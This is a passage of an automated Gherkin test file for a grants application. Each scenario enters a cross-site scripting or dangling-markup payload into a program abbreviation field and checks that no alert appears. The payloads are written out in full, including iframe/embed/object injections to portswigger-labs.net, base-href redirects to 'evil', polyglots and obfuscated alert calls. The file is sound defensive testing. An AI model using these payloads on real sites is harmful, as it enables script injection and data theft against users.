      | <a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=" | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301618 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                              | Field                |
      | <form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=" | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301619 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | <a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/ | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301622 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                              | Field                |
      | <embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301623 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                               | Field                |
      | <iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301625 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                | Field                |
      | <object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301626 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                        | Field                |
      | <frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301627 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | <input type=hidden type=image src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301628 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                            | Field                |
      | javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301631 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                          | Field                |
      | javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"  onmouseover=/*&lt;svg/*/onload=alert()//> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301632 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                           | Field                |
      | javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301633 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | ';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301635 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | ';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301637 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | ';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301639 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                 | Field                |
      | ';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301640 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | ';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301642 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | ';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301643 @ovee
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
